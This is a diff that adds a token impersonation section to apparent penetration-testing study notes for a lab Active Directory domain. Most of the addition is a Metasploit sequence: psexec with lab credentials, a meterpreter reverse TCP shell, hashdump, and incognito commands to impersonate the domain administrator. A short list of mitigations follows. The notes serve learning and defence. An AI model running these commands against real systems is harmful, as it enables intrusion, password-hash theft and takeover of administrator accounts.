@@ -295,3 +295,58 @@
     * Use strong passwords
 
     * Privilege Access Management (PAM)
+
+* Token impersonation:
+
+  * Tokens - temporary keys that allow access without using creds; can be either delegate (login, RDP) or impersonate (drive, script).
+
+  ```shell
+  msfconsole
+
+  use exploit/windows/smb/psexec
+
+  set RHOSTS 192.168.57.141
+
+  set smbdomain marvel.local
+
+  set smbpass Password1
+
+  set smbuser fcastle
+
+  set target 2
+  #native upload
+
+  options
+
+  set payload windows/x64/meterpreter/reverse_tcp
+
+  set lhost eth0
+
+  run
+  #gives meterpreter session
+
+  hashdump
+
+  load incognito
+  #metasploit module for token impersonation
+
+  list_tokens -u
+  #list tokens by user
+
+  impersonate_token marvel\\administrator
+  #two backslashes instead of one for character-escaping
+
+  whoami
+  #test if it worked
+
+  rev2self
+  #revert to old user
+  ```
+
+  * Mitigations:
+
+    * Limit user/group token creation permissions
+
+    * Account tiering
+
+    * Local admin restriction
